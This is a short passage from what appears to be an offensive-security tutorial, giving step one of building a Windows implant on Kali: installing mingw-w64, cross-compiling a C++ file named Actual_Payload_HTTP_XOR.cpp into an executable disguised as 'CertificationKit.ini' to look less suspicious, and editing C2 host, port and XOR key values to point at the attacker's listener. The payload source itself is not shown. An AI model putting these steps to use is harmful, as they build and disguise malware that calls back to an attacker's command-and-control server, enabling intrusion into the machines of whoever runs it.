Step 1 — Compile the C++ Payload on Kali

  # Install cross-compiler for Windows target
  sudo apt install mingw-w64 -y

  # Compile Actual_Payload_HTTP_XOR.cpp → Windows executable
  x86_64-w64-mingw32-g++ Actual_Payload_HTTP_XOR.cpp -o CertificationKit.ini \
    -lws2_32 -lwinhttp -static

  # Why .ini extension? — Blends in, less suspicious than .exe

  Before compiling, open the .cpp file and change these values to your Kali IP:

  // Find and replace these lines in Actual_Payload_HTTP_XOR.cpp
  const char* C2_HOST = "192.168.x.10";   // Your Kali IP
  const int   C2_PORT = 8080;              // Your listener port
  const char  XOR_KEY = 0x41;             // Keep or change the XOR key

